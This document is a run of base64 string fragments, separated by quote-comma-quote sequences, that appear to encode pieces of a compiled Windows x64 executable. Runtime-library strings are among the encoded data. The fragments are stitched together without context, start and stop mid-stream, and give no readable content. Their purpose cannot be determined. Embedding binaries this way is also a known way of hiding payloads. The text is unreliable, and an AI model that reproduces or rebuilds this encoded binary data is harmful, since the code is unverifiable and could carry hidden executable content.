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AAABzaW4AY29zAHRhbgBjZWlsAAAAAGZsb29yAAAAZmFicwAAAABtb2RmAAAAAGxkZXhwAAAAX2NhYnMAAABmbW9kAAAAAGZyZXhwAAAAX3kwAF95MQBfeW4AX2xvZ2IAAAAAAAAAX25leHRhZnRlcgAAAAAAAAAAAAAAAAAAeHABgAEAAACIcAGAAQAAAJBwAYABAAAAoHABgAEAAACwcAGAAQAAAMBwAYABAAAA0HABgAEAAADgcAGAAQAAAOxwAYABAAAA+HABgAEAAAAAcQGAAQAAABBxAYABAAAAIHEBgAEAAADHhgGAAQAAACxxAYABAAAAOHEBgAEAAABAcQG','GVyYXRvcicAAGBjb3B5IGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAAAAAYHVkdCByZXR1cm5pbmcnAGBFSABgUlRUSQAAAAAAAABgbG9jYWwgdmZ0YWJsZScAYGxvY2FsIHZmdGFibGUgY29uc3RydWN0b3IgY2xvc3VyZScAIG5ld1tdAAAAAAAAIGRlbGV0ZVtdAAAAAAAAAGBvbW5pIGNhbGxzaWcnAABgcGxhY2VtZW50IGRlbGV0ZSBjbG9zdXJlJwAAAAAAAGBwbGFjZW1lbnQgZGVsZXRlW10gY2xvc3VyZScAAAAAYG1hbmFnZWQgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBtYW5hZ2VkIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAYGR5bmFtaWMgaW5pdGlhbGl6ZXIgZm9yICcAAAAAAABgZHluYW1pYyBhdGV4aXQgZGVzdHJ1Y3RvciBmb3IgJwAAAAAAAAAAYHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAGB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAAAAAGBtYW5hZ2VkIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAGBsb2NhbCBzdGF0aWMgdGhyZWFkIGd1YXJkJwAAAAAAIFR5cGUgRGVzY3JpcHRvcicAAAAAAAAAIEJhc2UgQ2xhc3MgRGVzY3JpcHRvciBhdCAoAAAAAAAgQmFzZSBDbGFzcyBBcnJheScAAAAAAAAgQ2xhc3MgSGllcmFyY2h5IERlc2NyaXB0b3InAAAAACBDb21wbGV0ZSBPYmplY3QgTG9jYXRvcicAAAAAAAAABoCAhoCBgAAAEAOGgIaCgBQFBUVFRYWFhQUAADAwgFCAiAAIACgnOFBXgAAHADcwMFBQiAAAACAogIiAgAAAAGBoYGhoaAgIB3hwcHdwcAgIAAAIAAgABwgAAABTdW4ATW9uAFR1ZQBXZWQAVGh1AEZya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